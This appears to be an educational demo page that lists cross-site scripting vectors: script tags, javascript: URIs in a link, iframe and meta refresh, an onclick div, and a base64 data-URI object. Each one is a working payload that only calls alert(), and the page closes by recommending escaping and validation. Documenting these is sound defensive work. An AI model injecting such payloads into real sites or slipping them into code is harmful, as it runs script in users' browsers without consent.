Original Provided Cases

Case 1: Escaped Script Tag (test1)

This example shows a script tag rendered as text (i.e. escaped) so it does not execute.

<script>
 alert("test1");
</script>

Case 2: Template Injection Style (test2)

This example shows a script tag inside curly braces. If the system simply renders HTML, the tags may be interpreted.

{<script>alert("test2");</script>}

Case 3: Unescaped Script Tag (test3)

This is a plain script tag that, if inserted unsafely into a page, would execute immediately.

<script>
 alert("test3");
</script>

Additional XSS Vectors

1. Unescaped Script Injection

This is a direct insertion of a script tag. In a vulnerable context it would run immediately.

<script>
 alert("XSS via unescaped script");
</script>

Note: On this demo page it is shown as code only.

3. Anchor Tag with JavaScript URI

An attacker might use a link whose href starts with javascript: to execute code when clicked.

<a href="javascript:alert('XSS via JS URI');">Click me</a>

5. Inline Event on a Div

This example uses an inline onclick event on a non-standard element (here, a div) to trigger JavaScript.

<div onclick="alert('XSS via onclick');" style="cursor: pointer;">
  Click me to trigger alert
</div>

6. <iframe> with JavaScript URI

An iframe whose source is a javascript URI is another potential (though less common) vector:

<iframe src="javascript:alert('XSS via iframe');"></iframe>

Note: Many modern browsers restrict this usage.

7. <object> Tag with Data URI

This example uses a data URI to inject a base64‐encoded HTML snippet that contains a script.

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>

The base64 string above decodes to: <script>alert('XSS')</script>

8. <meta> Tag Refresh

In some scenarios, a meta tag can be used to redirect to a javascript URI:

<meta http-equiv="refresh" content="0;url=javascript:alert('XSS via meta');">

Warning: This rarely works on modern browsers but illustrates the concept.

These examples illustrate various ways that HTML (or a templating system) might render content unsafely. In practice, preventing XSS requires proper escaping and validation of any untrusted input before it is output to a page.
